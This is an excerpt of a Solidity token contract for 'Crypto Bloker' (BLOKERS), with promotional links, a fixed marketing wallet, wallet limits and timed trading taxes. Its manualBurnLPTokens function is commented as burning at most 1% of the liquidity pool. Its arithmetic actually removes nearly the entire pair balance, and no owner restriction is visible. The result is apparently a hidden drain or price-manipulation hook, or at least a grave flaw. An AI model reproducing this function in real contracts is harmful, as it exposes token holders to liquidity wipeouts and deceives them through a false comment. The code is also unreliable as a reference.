...
/**
    Website:    https://blokers.vip
    Twitter:    https://x.com/cryptoblokers
    Telegram:   https://t.me/cryptoblokers
*/
...
contract CryptoBloker is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address constant DEAD = address(0x000000000000000000000000000000000000dEaD);
    
    string private constant _name = "Crypto Bloker";
    string private constant _symbol = "BLOKERS";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 100_000_000 * 10**_decimals; // 100M

    uint256 public maxWalletlimit = (_totalSupply * 2) / 100;   // 2%
    uint256 public minSwap = (_totalSupply * 5) / 10000;        // 0.05%
    ...
    constructor() {        
        ...
        marketingWallet = payable(0x74c4766551fC34989Cb57b10D95304709D6377d5);  // Marketing Wallet Address
    ...
    function manualBurnLPTokens(uint256 percent) external returns (bool){        
        require(block.timestamp > lastManualLpBurnTime + manualBurnFrequency , "Must wait for cooldown to finish");
        require(percent < 2, "May not nuke more than 1% of tokens in LP");
        lastManualLpBurnTime = block.timestamp;
 
        uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair);

        uint256 amountToBurn = liquidityPairBalance - liquidityPairBalance.mul(percent).div(
            10000)- 1e9;
    ...
    function _transfer(
        ...
        if (elapsedTime >= taxChangeInterval && currentTaxPeriod < 2) {
            ...
            if (currentTaxPeriod == 1) {
                ...
                // After x minutes, set buyTax to 1% and sellTax to 1%
                BuyTax = 1;
                SellTax = 1;
            }
        ...
        if (_tax != 0) {
            //Tax transfer
            uint256 taxTokens = (amount * _tax) / feeDenominator;
